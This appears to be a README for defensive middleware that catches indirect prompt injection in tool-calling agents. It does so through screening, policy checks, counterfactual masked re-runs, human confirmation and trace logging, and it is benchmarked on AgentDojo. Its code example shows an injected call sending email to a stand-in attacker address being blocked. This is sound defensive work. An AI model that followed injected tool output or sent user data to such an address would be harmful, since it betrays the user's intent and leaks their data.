# Causal, explainable security middleware for tool-calling agents

Pluggable middleware that catches indirect prompt injection by testing
whether an agent's action was actually *caused by* the user's request,
instead of classifying tool output text as suspicious.

Full research grounding and architecture rationale: see
`docs/project-brief.md`.

## How it works

An agent's next tool call is checked in stages, each one only running when
the stage before it couldn't resolve the decision:

1. **Screening** — tool output is tagged trusted/untrusted by region. A
   judge model flags which regions actually matter for the current
   decision; irrelevant regions are masked out before the main agent acts
   on them.
2. **Policy check** — a three-way verdict: clearly safe (auto-execute),
   clearly a violation (block), or genuinely ambiguous (escalate).
3. **Counterfactual test** — for ambiguous cases, the agent's step is
   re-run with the user's real task swapped for a neutral placeholder,
   same tool output kept in context. If the real run and the placeholder
   run converge on the same tool call, the action wasn't driven by the
   user's task at all — it was driven by the tool output. That's the
   injection signal. Divergence means the action was genuinely
   task-driven.
4. **Human confirmation** — the rare last resort, only reached if the
   counterfactual test itself is inconclusive.
5. **Trace logging** — every step records what was screened, what was
   masked, and (for any step that reached the counterfactual test) the
   original-vs-masked comparison that produced the verdict. This is what
   makes a block explainable instead of a bare refusal.

## Repo structure

```
middleware/
  screening/   Provenance tagging, judge-based region screener,
               three-way policy check
  melon/       Counterfactual masking engine: masked re-execution,
               tool-call comparison, embedding threshold logic
  trace/       Trace/state schema, logging — the artifact any
               visualizer reads
adapters/      Provider adapters (OpenAI, Anthropic) for the middleware's
               own internal LLM calls — the judge and the masked run
eval/          Benchmark harness (AgentDojo), metrics reporting,
               hand-crafted test scenarios
demo/          Trace visualizer — renders a run as an HTML report
docs/          Project brief and design notes
```

## Using it live

`middleware.screening.live.Session` is the actual enforcement point — a
wrapped tool function's body never runs when the verdict is block. Everywhere
else in this repo evaluates a transcript of something that already happened;
this is the one entrypoint that stops a call before it executes.

```python
from middleware.screening.live import Session, Blocked
from adapters.judge import openai_judge

session = Session("Summarize anything urgent in my inbox.", judge_fn=openai_judge())

@session.protect
def read_email():
    return fetch_inbox()  # tool bodies are your own — wrap what you already have

@session.protect
def send_email(to, body):
    return smtp_client.send(to, body)

read_email()
try:
    send_email(to="attacker@evil.com", body="...")
except Blocked as e:
    print(e.trace.explanation)  # send_email's body never ran
```

Pass `melon_agent_call_fn` to wire in Stage 3 for ambiguous cases, or
`on_ask_user` to handle escalations Stage 3 can't resolve; leaving both unset
raises `NeedsConfirmation` instead of asking anyone.

## Running the benchmark

```
python -m eval.harness --provider openai --suite banking \
  --max-user-tasks 3 --max-injection-tasks 1 --trace-out traces.jsonl
python -m demo.visualize traces.jsonl -o report.html
```

Makes real, paid LLM calls. The agent model and the judge model are chosen
separately (`--model-id`, `--judge-model`): the judge answers one narrow
relevance question on every step and is the dominant added cost if it runs on
a frontier model.

Five metrics are reported, and the first three have to be read together — a
defense that stops every call scores perfectly on prevention and is useless:

| Metric | What it means |
|---|---|
| benign utility | task success with no attacker present |
| utility under attack | task success while being hijacked |
| attack prevention rate | share of genuinely successful attacks stopped |
| false positive rate | share of benign steps wrongly stopped |
| escalation / auto-resolution | share of steps needing the counterfactual test, and how many it settled without a human |

## The shared trace contract

Every stage reads/writes the same trace object, defined in
`middleware/trace/schema.md`:

```json
{
  "step": int,
  "context_label": {"integrity": "...", "confidentiality": "..."},
  "policy_label": {"integrity": "...", "confidentiality": "..."},
  "source_provenance": "trusted" | "untrusted",
  "screened_regions": {"relevant": [...], "masked": [...], "labels": {...}},
  "policy_verdict": "safe" | "block" | "escalate",
  "melon_check": {
    "ran": bool,
    "original_calls": [...],
    "masked_calls": [...],
    "distance": float,
    "verdict": "safe" | "block" | null
  } | null,
  "final_action": "execute" | "block" | "ask_user",
  "explanation": str
}
```

A label is a pair, not a single flag — the two axes move in opposite
directions when labels are joined, so confidentiality cannot be recovered
from a trusted/untrusted string. A step's verdict is exactly the comparison
`context_label ⊑ policy_label`, so the trace records both sides: storing only
the outcome would let the middleware assert a block it cannot explain.
`source_provenance` is the integrity axis, kept for consumers written against
the earlier single-axis shape.

## Setup

```
uv venv --python 3.12
uv pip install -r requirements.txt
```

## Tests

```
source .venv/bin/activate
python -m pytest tests/ -v
```
